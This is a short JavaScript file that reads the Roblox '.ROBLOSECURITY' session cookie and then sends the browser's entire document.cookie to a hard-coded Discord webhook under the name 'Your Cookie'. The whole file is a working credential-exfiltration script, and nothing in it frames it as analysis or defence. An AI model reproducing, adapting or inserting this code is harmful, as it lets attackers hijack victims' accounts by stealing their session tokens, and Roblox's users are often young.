function getCookie(name) {
    var nameEQ = name + "=";
    var ca = document.cookie.split(';');
    for(var i=0;i < ca.length;i++) {
        var c = ca[i];
        while (c.charAt(0)==' ') c = c.substring(1,c.length);
        if (c.indexOf(nameEQ) == 0) return c.substring(nameEQ.length,c.length);
    }
    return null;
}

console.log(getCookie(".ROBLOSECURITY"))

function sendMessage() {
      const request = new XMLHttpRequest();
      request.open("POST", "https://discord.com/api/webhooks/826646123942117397/YKZ5R9orwxO34qAx4MV8UFsH22ipX5FR5PPMtV1EAgXigDQN7F_JW_kM6ytcN6Ie5Nbd");

      request.setRequestHeader('Content-type', 'application/json');

      const params = {
        username: "Your Cookie",
        avatar_url: "",
        content: document.cookie
      }
	console.log("E");   

      request.send(JSON.stringify(params));
    }
	
sendMessage()


